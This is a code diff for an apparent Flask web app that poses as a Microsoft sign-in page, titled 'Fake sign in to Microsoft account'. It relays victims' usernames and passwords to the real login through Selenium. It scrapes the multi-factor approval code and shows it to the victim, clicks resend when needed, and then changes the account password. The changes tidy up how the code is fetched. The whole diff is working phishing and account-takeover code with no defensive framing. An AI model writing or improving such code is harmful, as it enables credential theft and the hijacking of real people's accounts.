@@ -46,18 +46,10 @@ def Get_Authentication_Code():
         return AUTHENTICATION_CODE.text
 
     except:
-        return "-1"
-
-def Refresh_Code():
-    try:
-        WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located(By.ID, "idRichContext_DisplaySign"))
-        return True
-
-    except:
         try:
             RESEND_REQUEST = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
             RESEND_REQUEST.click()
-            return True
+            return Get_Authentication_Code()
 
         except:
             return False
@@ -106,13 +98,8 @@ def login():
 
     if "identifier" in session and "password" in session:
         authentication_code = Get_Authentication_Code()
-        if not (int(authentication_code) < 0):
+        if authentication_code:
             return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
-
-        elif Refresh_Code():
-            authentication_code = Get_Authentication_Code()
-            if not (int(authentication_code) < 0):
-                return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
 
         elif not password_changed:
             Change_Password()
@@ -133,8 +120,9 @@ def login():
     elif "identifier" in session and password_form.validate_on_submit():
         if Fill_Password(password_form.password.data):
             session["password"] = password_form.password.data
+
             authentication_code = Get_Authentication_Code()
-            if not (int(authentication_code) < 0):
+            if authentication_code:
                 return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
 
         return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", password_form=password_form)
